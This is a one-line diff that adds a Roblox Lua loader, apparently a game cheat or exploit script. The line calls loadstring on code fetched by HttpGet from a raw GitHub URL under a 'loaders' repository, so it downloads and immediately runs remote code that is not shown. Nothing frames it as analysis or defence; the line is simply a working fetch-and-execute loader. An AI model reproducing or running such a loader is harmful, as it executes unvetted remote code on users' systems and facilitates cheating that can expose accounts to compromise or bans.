@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/clean-crew-class-skins-spam4-q0opn1ddicdjpg.lua"))()
